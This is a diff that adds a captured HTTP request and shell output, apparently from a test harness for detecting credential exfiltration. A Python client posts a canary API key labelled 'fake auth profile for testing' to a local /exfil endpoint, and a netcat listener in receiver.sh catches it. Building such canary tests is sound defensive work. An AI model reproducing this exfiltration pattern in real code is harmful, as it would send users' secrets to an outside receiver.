@@ -1,0 +1,9 @@
+POST /exfil HTTP/1.1
+Accept-Encoding: identity
+Content-Length: 102
+Host: 127.0.0.1:8080
+User-Agent: Python-urllib/3.11
+Content-Type: application/json
+Connection: close
+
+{"source": "ip-info-py", "data": {"api_key": "canary-12345", "note": "fake auth profile for testing"}}./receiver.sh: line 2: 27052 Killed                  nc -lkp 8080
